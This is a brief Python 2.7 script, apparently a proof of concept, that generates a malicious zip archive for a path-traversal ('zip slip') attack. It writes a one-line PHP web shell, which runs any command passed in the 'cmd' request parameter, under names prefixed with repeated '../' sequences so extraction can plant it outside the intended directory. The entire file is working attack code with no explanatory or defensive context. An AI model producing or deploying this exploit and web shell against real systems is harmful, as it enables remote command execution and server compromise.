#!/usr/bin/python2.7
import zipfile
from cStringIO import StringIO 

def create_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    content = "<?php if(isset($_REQUEST['cmd'])) {$cmd = ($_REQUEST['cmd']); system($cmd);} ?>"
    base = ""
    for i in range(1,11):
        base = base + '../'
        z.writestr(base + 'cmd.php', content)
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close() 

create_zip()
